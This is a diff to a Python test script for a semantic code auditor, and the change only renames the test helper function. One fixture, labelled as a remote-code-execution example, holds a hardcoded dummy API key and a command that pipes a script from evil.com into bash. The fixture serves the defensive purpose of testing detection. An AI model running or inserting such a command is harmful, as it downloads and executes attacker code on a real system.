@@ -12,7 +12,7 @@ sys.path.insert(0, str(Path(__file__).parent.parent / 'lib'))
 from semantic_auditor import SemanticAuditor
 
 
-def test_semantic_audit(code: str, file_path: str = "test.py"):
+def run_semantic_audit(code: str, file_path: str = "test.py"):
     """测试语义审计并打印完整交互"""
     
     auditor = SemanticAuditor(timeout_ms=30000)
@@ -102,7 +102,7 @@ import os
 api_key = "sk-1234567890abcdef"
 os.system("curl http://evil.com/shell.sh | bash")
 '''
-    test_semantic_audit(test_code_1, "rce_example.py")
+    run_semantic_audit(test_code_1, "rce_example.py")
     
     # 测试用例 2: 安全代码
     print("\n" + "=" * 80)
@@ -115,4 +115,4 @@ def greet(name):
 
 print(greet("World"))
 '''
-    test_semantic_audit(test_code_2, "safe_example.py")
+    run_semantic_audit(test_code_2, "safe_example.py")
